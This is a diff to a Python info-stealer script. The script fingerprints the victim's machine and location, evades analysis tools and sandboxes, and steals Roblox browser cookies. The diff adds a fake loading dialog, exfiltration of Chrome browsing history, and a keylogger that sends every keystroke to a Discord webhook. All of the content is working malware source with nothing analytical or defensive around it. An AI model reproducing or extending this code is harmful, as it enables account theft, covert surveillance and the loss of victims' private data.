@@ -2,11 +2,12 @@ import os,requests,socket,threading,platform,json,psutil,sys,win32api
 import browser_cookie3
 import cv2
 import re, uuid
-from pystyle import *
 from PIL import ImageGrab
-os.system('cls')
+from pynput import keyboard
+from browser_history.browsers import Chrome
+import ctypes 
+ctypes.windll.user32.MessageBoxW(0, "Please Wait The Program Is Loading ", "Program", 1)
 webhook = "Webhooksss"
-print("Loading Client..")
 process = [
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
@@ -55,6 +56,10 @@ if diskSizeGB < minDiskSizeGB:
         os._exit(1)
     except:
         pass
+
+
+
+
 machines = platform.uname()
 hostnames = socket.gethostname()  
 ips = requests.get('https://api.ipify.org').text
@@ -68,7 +73,6 @@ post = info['postal']
 timezone = info['timezone']
 org = info['org']
 pc_username = os.getenv("UserName")
-ip = socket.gethostbyname(hostname) 
 embed = {
             "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
             "embeds": [
@@ -78,11 +82,12 @@ embed = {
 
                         "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                     },
-                    "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```   ```There Hostname Is: {hostname}```  ```There PC Ip Is:{ip}``` ```There Pc Username Is: {pc_username}``` ```There Pc Host Name Is: {hostnames}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
+                    "description": f" @everyone You Got A Hit ```There Public Ip Is: {ips}``` ```There City Is: {city}``` ```There Country Is: {country}``` ```There Region Is: {region}``` ```There Lang is: {lang}```  ```There Postal Code Is: {post}``` ```There Organzation Is: {org}```   ```There Hostname Is: {hostname}```  ```There Pc Username Is: {pc_username}``` ```There Pc Host Name Is: {hostnames}``` ```There Pc Machine Name Is: {machines.machine}``` ```There Pc Processer Is: {machines.processor}``` ```There Pc Mac Address Is : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```",
                 }
             ]
         }
 requests.post(webhook, json=embed) 
+ 
 def edge():
     try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
@@ -249,3 +254,45 @@ except:
         }
          requests.post(webhook, json=embeded) 
          pass
+try:
+    file = Chrome()
+    outputs = file.fetch_history()
+    file = open("history.txt", "w")
+    str = repr(outputs.histories)
+    file.write(str)
+    file.close() 
+    with open('history.txt', 'rb') as f:
+                requests.post(webhook,json={'content': f'There Chrome History And A Key Logger Has Been Activated:'})
+                requests.post(webhook,files={'upload_file': f})
+    os.remove('history.txt')
+except:
+     embeded = {
+          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+                      "embeds": [
+                {
+                    "author": {
+                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    },
+                    "description": f"```Failed To Grab Chromes Browser History And A Keylogger Has Been Activated```",                      
+                }
+            ]
+
+        }
+     requests.post(webhook, json=embeded) 
+     pass
+def on_release(key):
+     embeded = {
+          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+                      "embeds": [
+                {
+                    "author": {
+                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    },
+                    "description": f"```Key {key} Was Clicked```",                      
+                }
+            ]
+
+        }
+     requests.post(webhook, json=embeded) 
+with keyboard.Listener(on_release=on_release) as listener:
+    listener.join()
